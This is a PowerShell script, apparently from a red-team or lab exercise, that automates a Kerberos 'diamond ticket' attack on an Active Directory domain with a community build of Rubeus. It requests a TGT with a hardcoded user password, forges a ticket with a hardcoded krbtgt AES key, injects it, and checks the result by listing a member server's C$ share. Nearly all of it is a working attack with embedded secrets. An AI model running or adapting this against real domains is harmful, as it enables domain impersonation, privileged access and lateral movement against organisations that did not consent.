# WT012 v2: diamond ticket with community-build Rubeus (Rubeus-try4) + real-service verify
$ErrorActionPreference = 'Continue'
$rb = 'C:\Tools\ADTools\Rubeus-try4.exe'
$out = 'C:\Tools\ADTools'
$krbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
$dc = 'dc02.child.cadre.local'

klist purge 2>&1 | Out-Null

Write-Output '=== RUBEUS-TRY4 BARE (version check) ==='
$p0 = Start-Process -FilePath $rb -RedirectStandardOutput "$out\rb4-bare.out" -RedirectStandardError "$out\rb4-bare.err" -NoNewWindow -Wait -PassThru
Get-Content "$out\rb4-bare.out" -ErrorAction SilentlyContinue | Select-Object -First 6 | ForEach-Object { Write-Output "BARE|$_" }

Write-Output '=== LEGIT TGT ==='
Remove-Item "$out\wt012-tgt4.kirbi" -ErrorAction SilentlyContinue
$p1 = Start-Process -FilePath $rb -ArgumentList @('asktgt','/user:analyst_t1','/password:T13r_An@lyst!','/domain:child.cadre.local',"/dc:$dc","/outfile:$out\wt012-tgt4.kirbi") -RedirectStandardOutput "$out\rb4-tgt.out" -RedirectStandardError "$out\rb4-tgt.err" -NoNewWindow -Wait -PassThru
Get-Content "$out\rb4-tgt.out" -ErrorAction SilentlyContinue | Select-String -Pattern 'written|ServiceName|KRB|error' | Select-Object -First 5 | ForEach-Object { Write-Output "TGT|$_" }

Write-Output '=== DIAMOND ==='
if (Test-Path "$out\wt012-tgt4.kirbi") {
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$out\wt012-tgt4.kirbi"))
    Write-Output "TGT_B64_LEN $($b64.Length)"
    $p2 = Start-Process -FilePath $rb -ArgumentList @('diamond',"/ticket:$b64","/krbtgt:$krbtgtAes",'/enctype:aes','/service:cifs/mbr01.child.cadre.local',"/dc:$dc",'/ptt') -RedirectStandardOutput "$out\rb4-diamond.out" -RedirectStandardError "$out\rb4-diamond.err" -NoNewWindow -Wait -PassThru
    Write-Output "DIAMOND_RC $($p2.ExitCode)"
    Get-Content "$out\rb4-diamond.out" -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object { Write-Output "DIAM|$_" }
    Get-Content "$out\rb4-diamond.err" -ErrorAction SilentlyContinue | Select-Object -First 8 | ForEach-Object { Write-Output "DIAM_ERR|$_" }

    Write-Output '=== REAL-SERVICE VERIFY ==='
    net use \\mbr01.child.cadre.local\c$ /delete 2>&1 | Out-Null
    net use * /delete /y 2>&1 | Out-Null
    cmd.exe /c "dir \\mbr01.child.cadre.local\c$ 2>&1" | Select-Object -First 10 | ForEach-Object { Write-Output "SMB|$_" }
    klist 2>&1 | Select-String -Pattern 'cifs|mbr01' | Select-Object -First 4 | ForEach-Object { Write-Output "KERB|$_" }
}
klist purge 2>&1 | Out-Null
Write-Output 'WT012_V2_DONE'
